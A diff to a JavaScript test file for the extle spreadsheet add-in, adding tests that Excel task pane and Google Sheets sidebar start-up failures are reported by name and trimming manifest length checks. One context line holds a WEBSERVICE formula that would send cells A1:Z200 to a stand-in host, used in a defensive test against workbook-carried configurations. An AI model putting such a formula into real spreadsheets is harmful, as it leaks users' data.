@@ -109,6 +109,15 @@ test("Office.onReady builds the pane in Excel and says so elsewhere; the pane th
   assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "the document had the configuration; using it never copies it into the browser");
 });
 
+test("a task pane that cannot start says so under the extle name", async () => {
+  const { host, root, bridge } = excelPane({ sheets: { S: [["a"]] }, active: { sheet: "S", address: "A1" } });
+  // Any error out of the pane's start(); here the fake refuses the selection handler.
+  host.Office.context.document.addHandlerAsync = () => { throw new Error("no selection events"); };
+  bridge.start({ host: host.Office.HostType.Excel });
+  await new Promise((resolve) => setImmediate(resolve));
+  assert.equal(root.textContent, "extle could not start: no selection events");
+});
+
 test("a workbook whose settings carry another configuration cannot replace the organisation's, write its rows or formula unseen, or reach the browser copy", async () => {
   const formula = '=WEBSERVICE("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",1,A1:Z200)))';
   const carried = JSON.stringify({
@@ -285,6 +294,19 @@ test("the sidebar page talks to Code.gs through google.script.run, asks for 5000
   assert.equal(sandbox.localStorage.getItem("actleSheetsConfig"), null, "using the spreadsheet's configuration never copies it into the browser");
 });
 
+test("a sidebar that cannot start says so under the extle name", async () => {
+  const { gs } = appsScript({ sheets: { S: [["a"]] }, active: { sheet: "S", row: 1, col: 1 }, properties: {} });
+  const server = fakeGoogleRun({ getActiveCellContext: gs.getActiveCellContext, loadConfig: gs.loadConfig, saveConfig: gs.saveConfig });
+  const root = new Node("div");
+  // Any error out of the pane's start(); here the page cannot set up its poll.
+  const globals = { google: { script: { run: server.run } }, document: fakeDocument({ pane: root }), localStorage: storageOf(), ActleSheets: sheets, setInterval: () => { throw new Error("no timers"); } };
+  const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
+  const html = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
+  vm.runInContext(/<script>([\s\S]*?)<\/script>/.exec(html)[1], sandbox, { filename: "Sidebar.html" });
+  await new Promise((resolve) => setImmediate(resolve));
+  assert.equal(root.textContent, "extle could not start: no timers");
+});
+
 /** Open and close tags must nest; comments, the prolog and self-closing tags are skipped. */
 function xmlBalanced(xml) {
   const stack = [];
@@ -328,12 +350,11 @@ test("the add-in is named extle wherever Excel shows it, within the manifest's d
   assert.equal(attr(/<bt:String id="actle\.OpenPane\.Label" DefaultValue="([^"]*)"\/>/), "Open extle", "the button and its supertip title");
   assert.match(attr(/<bt:String id="actle\.OpenPane\.Tip" DefaultValue="([^"]*)"\/>/), /^Open the extle pane: /);
   assert.match(manifest, /<ProviderName>actle<\/ProviderName>/, "the provider stays actle");
-  // learn.microsoft.com/javascript/api/manifest: DisplayName up to 125 characters, Description up to 250, a ShortStrings string up to 125, a LongStrings string up to 250.
-  assert.ok(attr(/<DisplayName DefaultValue="([^"]*)"\/>/).length <= 125);
+  // learn.microsoft.com/javascript/api/manifest: Description up to 250 characters, a LongStrings string up to 250.
+  // The DisplayName and the ShortStrings are pinned exactly, so their 125-character limits need no check of their own.
   assert.ok(attr(/<Description DefaultValue="([^"]*)"\/>/).length <= 250);
   const strings = (block) => [...(manifest.match(new RegExp("<bt:" + block + ">([\\s\\S]*?)</bt:" + block + ">")) || ["", ""])[1].matchAll(/DefaultValue="([^"]*)"/g)].map((m) => m[1]);
   assert.deepEqual(strings("ShortStrings"), ["extle", "Open extle"]);
-  assert.ok(strings("ShortStrings").every((text) => text.length <= 125));
   assert.equal(strings("LongStrings").length, 1);
   assert.ok(strings("LongStrings").every((text) => text.length <= 250));
   const page = fs.readFileSync(path.join(ADDIN, "taskpane.html"), "utf8");
